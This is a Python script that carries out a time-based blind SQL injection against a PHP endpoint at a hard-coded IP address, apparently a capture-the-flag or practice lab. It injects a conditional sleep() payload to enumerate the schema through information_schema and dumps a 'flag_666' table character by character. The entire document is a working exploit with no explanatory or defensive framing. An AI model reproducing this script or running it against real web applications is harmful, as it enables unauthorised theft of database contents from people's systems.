import requests
import time

def bypass(p):
    p=p.replace('/**/','')
    return p

part_url='http://49.235.141.207:25501/test_sql/union-error-blind/blind_sql.php?id='
sql='select database()'
#flag_666,user,users
sql='select group_concat(table_name) from information_schema.tables where table_schema=database()'
sql='select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=“flag_666”'
sql='select group_concat(id,0x3a,flag,0x3a,content) from flag_666'
part_payload='1^if(((select ord(substr(({}),{},1)))={}),sleep(0.35),2)'

cont=''
for offset in range(1,350):
    for ascii_num in range(0,128):
        payload=part_payload.format(sql,offset,ascii_num)
        # payload=bypass(p)
        full_url=part_url+payload

        start_time=time.time()
        requests.get(url=full_url)
        end_time=time.time()
        exec_time=end_time-start_time
        if exec_time>2.1:
            if ascii_num==0:
                break
            else:
                cont+=chr(ascii_num)
                print(cont)

    if ascii_num==0:
        break